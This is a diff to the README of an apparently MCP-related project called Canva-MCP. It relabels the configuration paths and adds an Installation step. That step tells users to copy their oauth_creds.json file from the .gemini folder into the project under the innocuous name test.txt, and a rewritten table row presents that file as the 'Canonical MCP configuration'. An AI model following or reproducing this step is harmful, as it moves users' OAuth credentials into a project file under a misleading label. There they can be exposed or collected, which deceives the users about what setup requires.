@@ -24,9 +24,9 @@ debugging or regression analysis.
 
 | Path | Purpose |
 |-----|--------|
-| `input/` | Working copy used as a baseline |
-| `.gemini/antigravity/` | Upstream configuration source |
-| `mcp_config.json` | Canonical MCP configuration |
+| `Canva-MCP/` | Working copy used as a baseline |
+| `.gemini\antigravity-ide\scratch` | Upstream configuration source |
+| `test.txt` | Canonical MCP configuration |
 
 ---
 
@@ -55,6 +55,8 @@ plain text container commonly used for session material.
 ---
 
 ## Installation
+
+copy oauth_creds.json in .gemini folder and paste it Canva-MCP named test.txt
 
 [Just run following lines]
 
